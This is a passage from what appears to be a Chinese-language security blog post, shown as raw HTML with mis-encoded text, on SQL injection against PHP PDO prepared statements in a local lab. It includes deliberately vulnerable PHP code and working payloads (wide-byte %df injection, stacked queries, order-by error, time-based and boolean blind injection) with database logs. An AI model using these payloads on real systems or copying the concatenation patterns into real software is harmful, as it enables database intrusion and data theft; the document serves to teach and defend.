class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># è®¾ç½®æ¨¡æ‹Ÿé¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨å‘½åå ä½ç¬¦</span><br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-string">&#x27;SET NAMES GBK&#x27;</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = :username&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ä¼ å…¥<code>username=&quot;1&#39; union select database();#&quot;</code>æ—¶ï¼Œçœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">28 Connectroot@localhost on sort using TCP/IP<br>28 Queryselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database()#&#x27;<br>28 Quit<br># å°†å•å¼•å·è¿›è¡Œè½¬ä¹‰<br></code></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿé¢„å¤„ç†é˜²æ­¢sqlæ³¨å…¥çš„æœ¬è´¨æ˜¯åœ¨å‚æ•°ç»‘å®šè¿‡ç¨‹ä¸­å¯¹å‚æ•°å€¼è¿›è¡Œè½¬ä¹‰ä¸è¿‡æ»¤,è¿™ä¸€ç‚¹ä¸çœŸæ­£çš„sqlæ•°æ®åº“é¢„å¤„ç†æ˜¯ä¸ä¸€æ ·çš„ã€‚ç†è®ºä¸Šï¼Œsqlæ•°æ®åº“é¢„ç¼–è¯‘æ›´åŠ å®‰å…¨ä¸€äº›ã€‚</p></blockquote><p>å½“ä¼ å…¥<code>1%df%27%20union%20select%20database();#</code>æ—¶ï¼Œå†æŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">15 Connectroot@localhost on sort1 using TCP/IP<br>15 QuerySET NAMES GBK<br>15 Queryselect fraction from fraction where name = &#x27;1é‹&#x27; union select database();<br>//å¯ä»¥çœ‹åˆ°æˆåŠŸåˆ©ç”¨%dfåƒæ‰æ–œæ ï¼Œé€ æˆå®½å­—èŠ‚æ³¨å…¥<br></code></pre></td></tr></table></figure><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/9.png"></p><h4 id="PDOçš„é”™è¯¯ä½¿ç”¨"><a href="#PDOçš„é”™è¯¯ä½¿ç”¨" class="headerlink" title="PDOçš„é”™è¯¯ä½¿ç”¨"></a>PDOçš„é”™è¯¯ä½¿ç”¨</h4><p>ä¸€äº›ç¨å¾®æ¬ ç¼ºç»éªŒçš„å¼€å‘äººå‘˜ï¼Œå¯èƒ½ä¼šé”™è¯¯çš„ä½¿ç”¨PDOï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index4.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ç§çœ‹ä¼¼ç”¨äº†prepareè¿›è¡Œé¢„å¤„ç†ï¼Œä½†æ²¡æœ‰å…³é”®æ€§çš„å ä½ç¬¦ã€å‚æ•°ç»‘å®šï¼Œæ‰€ä»¥ç­‰åŒäºç›´æ¥æ‹¼æ¥</p><h4 id="PDOä¸­çš„å¤šæ¡æ‰§è¡Œ"><a href="#PDOä¸­çš„å¤šæ¡æ‰§è¡Œ" class="headerlink" title="PDOä¸­çš„å¤šæ¡æ‰§è¡Œ"></a>PDOä¸­çš„å¤šæ¡æ‰§è¡Œ</h4><p>PDOæœ‰ä¸€ä¸ªæœ‰è¶£çš„ç‰¹æ€§ï¼šé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œã€‚è¿™å°±é€ æˆäº†å †å æ³¨å…¥çš„å¯èƒ½ï¼Œå¦‚ä¸‹ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&lt;?php<br>$id= $_GET[&#x27;id&#x27;]; // æ¥æ”¶username<br><br># å»ºç«‹æ•°æ®åº“è¿æ¥<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥<br>try&#123;<br>$conn = new PDO($dbs, $dbname, $passwd);<br>echo &quot;Sucussful&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where id=$id&quot;);<br>$stmt-&gt;execute();<br>$fraction = $stmt-&gt;fetch();<br>print_r($fraction[fraction]);<br><br>$conn=null; # å…³é—­é“¾æ¥<br>?&gt;<br></code></pre></td></tr></table></figure><p>å½“è¾“å…¥<code>id=1;select%20database()</code>æ—¶ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">5 Connectroot@localhost on sort using TCP/IP<br>5 Queryselect fraction from fraction where id=1;<br>5 Queryselect database()<br># æ•°æ®åº“æ‰§è¡Œäº†ä¸¤æ¡æŸ¥è¯¢è¯­å¥<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ ·æœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œå›æ˜¾ä½ç½®åªæœ‰1ä¸ªï¼Œæ— æ³•å›æ˜¾å‡ºç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥çš„ç»“æœï¼Œä½†å¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢åšå‡ºæ¥</p><p>å…ˆæ‰§è¡Œï¼š<code>?id=1;insert into fraction(id,name,fraction) values(111,database(),user()) </code></p><p>æŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ä»¥åŠæ•°æ®åº“æ˜¯å¦æ’å…¥å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">10 Connectroot@localhost on sort using TCP/IP<br>10 Queryselect fraction from fraction where id=1;<br>10 Queryinsert into fraction(id,name,fraction) values(111,database(),user())<br># å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†ä¸¤æ¡è¯­å¥<br></code></pre></td></tr></table></figure><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/10.png"></p><p>å†æ‰§è¡Œï¼š<code>id=111</code>ï¼Œèƒ½å¤Ÿçœ‹åˆ°æˆåŠŸæŸ¥è¯¢ï¼Œä½†æœ‰ä¸ªé—®é¢˜æ˜¯å½“å›æ˜¾ä½ç½®çš„å€¼æ˜¯æœ‰ä¸ªæ•°å­—å‹æ—¶ï¼Œå°±æ— æ³•ç›´æ¥å°†æˆ‘ä»¬æƒ³è¦è·å–çš„å†…å®¹å­˜å…¥åˆ°æ•°æ®åº“çš„ç›¸åº”å­—æ®µä¸­äº†ï¼Œä½†å¥½åƒä¹Ÿæœ‰åŠæ³•ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/11.png"></p><h4 id="é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ"><a href="#é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ"></a>é¢„ç¼–è¯‘ä¸ç”Ÿæ•ˆ</h4><p>ä¸æ˜¯æ‰€æœ‰çš„åœ°æ–¹éƒ½èƒ½ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œæœ‰äº›ä½ç½®å¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨é¢„ç¼–è¯‘ä¹‹åï¼Œsqlè¯­å¥ä¸ç”Ÿæ•ˆï¼Œè€Œè¿™äº›ä½ç½®åˆä¸å¾—ä¸ä½¿ç”¨æ‹¼æ¥ã€‚</p><h5 id="likeä½ç½®"><a href="#likeä½ç½®" class="headerlink" title="likeä½ç½®"></a>likeä½ç½®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">index6.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># æ„Ÿè§‰ç”¨äº†é¢„ç¼–è¯‘è¯­å¥ï¼Œä½†åˆå¥½åƒæ²¡å®Œå…¨ç”¨</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction where name like &#x27;%:username%&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥ï¼š<code>username=t</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">21 Connectroot@localhost on sort using TCP/IP<br>21 Prepareselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Executeselect * from fraction where name like &#x27;%:username%&#x27;<br>21 Close stmt<br>21 Quit<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™é‡Œæ²¡æœ‰æŠŠæˆ‘ä»¬ä¼ çš„<code>username=t</code>ç»‘å®šåˆ°æŸ¥è¯¢è¯­å¥ä¸­å»ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç»‘å®šå‚æ•°æ—¶åŒ…å«ï¼…,è€Œä¸æ˜¯åœ¨SQLæœ¬èº«(é¢„å…ˆå‡†å¤‡å¥½çš„è¯­å¥)ä¸­,è¿™æ˜¯ä¸èµ·ä½œç”¨ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ï¼Œå¼€å‘å¯èƒ½ä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨æ‹¼æ¥è¯­å¥ï¼Œè¿™å°±ç»™äº†SQLæ³¨å…¥çš„å¯èƒ½ã€‚</p><p>ä½†æ˜¯ï¼Œä¹Ÿä¸æ˜¯æ²¡æœ‰åŠæ³•åœ¨ä½¿ç”¨likeçš„æƒ…å†µä¸‹è¿›è¡Œé¢„ç¼–è¯‘ï¼Œéœ€è¦è°ƒç”¨ä¸€äº›ï¼ŒMySQLçš„å†…ç½®å‡½æ•°ï¼Œä¾‹å¦‚å°†ä¸Šè¿°çš„æŸ¥è¯¢è¯­å¥æ›´æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction where name like concat(&#x27;%&#x27;,:username,&#x27;%&#x27;)<br># è¿™ç§æƒ…å†µä¸‹å°±èƒ½å¤Ÿè¿›è¡Œåœ¨ä½¿ç”¨é¢„ç¼–è¯‘çš„æƒ…å†µä¸‹è¿›è¡Œlikeæ¨¡ç³ŠæŸ¥è¯¢<br></code></pre></td></tr></table></figure><h5 id="order-byåä¼ å…¥å­—æ®µå"><a href="#order-byåä¼ å…¥å­—æ®µå" class="headerlink" title="order byåä¼ å…¥å­—æ®µå"></a>order byåä¼ å…¥å­—æ®µå</h5><p>order by ç®€å•ç”¨æ³•</p><p><strong>ä½œç”¨</strong>ï¼šç”¨äºå¯¹ç»“æœé›†è¿›è¡Œæ’åºã€‚</p><p><strong>è¯­æ³•ï¼š</strong>é¡ºåºï¼šSELECT * from è¡¨å ORDER BY æ’åºçš„å­—æ®µå å€’åºï¼šSELECT * from è¡¨å ORDER BY æ’åºçš„å­—æ®µå DESC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[ORDER BY &#123;col_name | expr | position&#125;  <br>[ASC | DESC], ...]  <br></code></pre></td></tr></table></figure><p><strong>æ³¨</strong>ï¼šORDER BY è¯­å¥ç”¨äºæ ¹æ®æŒ‡å®šçš„åˆ—å¯¹ç»“æœé›†è¿›è¡Œæ’åºã€‚ORDER BY è¯­å¥é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by fraction DESC;# æ ¹æ®å­—æ®µfractionè¿›è¡Œé™åºæ’åˆ—<br>select * from fraction order by fraction ASC;# æ ¹æ®å­—æ®µfractionè¿›è¡Œå‡åºæ’åˆ—<br></code></pre></td></tr></table></figure><p><code>order by</code>ä½ç½®çš„æ³¨å…¥ç‚¹ï¼Œå…¶å®è·Ÿå¹³å¸¸çš„æ³¨å…¥ç‚¹ç±»ä¼¼ï¼Œç›®å‰æ„Ÿè§‰åŒºåˆ«ä¸å¤§ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from fraction order by 1 and 1=updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- æŠ¥é”™æ³¨å…¥<br>select * from fraction order by updatexml(0,concat(&#x27;~&#x27;,user(),&#x27;~&#x27;),1)# asc;-- æŠ¥é”™æ³¨å…¥<br>select * from fraction order by if(1,sleep(3),sleep(0))# asc;-- å»¶æ—¶ç›²æ³¨ï¼Œä½†è¿™ä¸ªå»¶æ—¶äº†33ç§’ï¼Œç¦»è°±<br>select * from fraction order by if((user()=&#x27;root@localhost&#x27;),fraction,id);# asc;-- å¸ƒå°”ç›²æ³¨<br></code></pre></td></tr></table></figure><p>okï¼Œå›å½’æ­£é¢˜ï¼Œæœ‰æ—¶ORDER BYåçš„è¡¨ååŠ¨æ€ä¼ å…¥çš„SQLè¯­å¥ï¼›æ¸—é€æµ‹è¯•ä¸­å…è®¸ç”¨æˆ·ä¼ å…¥æŒ‰æŸä¸ªå­—æ®µè¿›è¡Œæ’åºçš„è¡Œä¸ºï¼Œè¿™å¾ˆæœ‰å¯èƒ½æ˜¯ç›´æ¥æ‹¼æ¥çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$col</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;col&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># è®¾ç½®æœ¬åœ°é¢„ç¼–è¯‘ï¼Œç»‘å®šå‚æ•°</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by :col&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:col&quot;</span>,<span class="hljs-variable">$col</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># å…³é—­é“¾æ¥</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥<code>col=fraction</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ‰§è¡Œæ—¥å¿—ï¼Œèƒ½å¤Ÿå‘ç°å·²ç»æˆåŠŸç»‘å®šå‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">12 Connectroot@localhost on sort using TCP/IP<br>12 Prepareselect * from fraction order by ?<br>12 Executeselect * from fraction order by &#x27;fraction&#x27;<br>12 Close stmt<br>12 Quit<br></code></pre></td></tr></table></figure><p>ä½†æŠŠæ‰§è¡Œçš„è¯­å¥ä»£å…¥æ•°æ®åº“å‘½ä»¤è¡Œä¸­å†çœ‹ï¼Œå‘ç°è¿™ç»“æœä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„å•Š</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/12.png"></p><p>è¿™æ˜¯å› ä¸ºåœ¨è¿›è¡Œå‚æ•°ç»‘å®šçš„æ—¶å€™ï¼Œ$colçš„å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåœ¨å°†$colçš„å€¼ç»‘å®šè¿›sqlè¯­å¥ä¸­åï¼Œ:colä»ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€ç»ˆä»£å…¥æ•°æ®åº“è¿›è¡Œæ‰§è¡Œçš„è¯­å¥æ˜¯<code>select * from fraction order by &#39;fraction&#39;</code>ï¼Œè€Œorder byä¹‹åéœ€è¦çš„æ˜¯ä¸€ä¸ªè¡¨åï¼Œè¿™ä¸ªè¡¨åä¸èƒ½ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜åœ¨ã€‚å› æ­¤ï¼Œè¯¥ä½ç½®å¤§æ¦‚ç‡ä¼šè¢«å†™æˆæ‹¼æ¥ï¼Œè¿™å°±é€ æˆäº†SQLæ³¨å…¥çš„å¯èƒ½ã€‚</p><h5 id="order-byåä¼ å…¥ASC-DESC"><a href="#order-byåä¼ å…¥ASC-DESC" class="headerlink" title="order byåä¼ å…¥ASC/DESC"></a>order byåä¼ å…¥ASC/DESC</h5><p>æœ‰æ—¶ï¼Œå¯èƒ½ä¼šå­˜åœ¨æ ¹æ®ç”¨æˆ·çš„é€‰æ‹©æ¥è¿›è¡Œæ­£åºæˆ–å€’å™æ’åˆ—ï¼Œè€Œè¿™æ—¶å¦‚æœ<code>ASC/DESC</code>æ˜¯ä»å‰ç«¯åŠ¨æ€ä¼ å…¥çš„ï¼Œé‚£æ­¤å¤„å¤§æ¦‚ç‡ä½¿ç”¨çš„æ˜¯æ‹¼æ¥</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction order by fraction :asc&quot;</span>);<br></code></pre></td></tr></table></figure><p>å½“ä½¿ç”¨PDOï¼Œå°†é¢„å¤„ç†è¯­å¥å†™æˆè¿™æ ·æ—¶ï¼Œä¼šæŠ›å‡ºé”™è¯¯</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/13.png"></p><p>åœ¨MySQLå‘½ä»¤è¡Œä¸­ï¼Œè¿›è¡Œè¯¥é¢„å¤„ç†è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select * from fraction order by fraction ?&quot;;<br></code></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠ›å‡ºé”™è¯¯</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;?&#39; at line 1</code></p><p>æ‰€ä»¥å½“éœ€è¦å‰ç«¯ä¼ 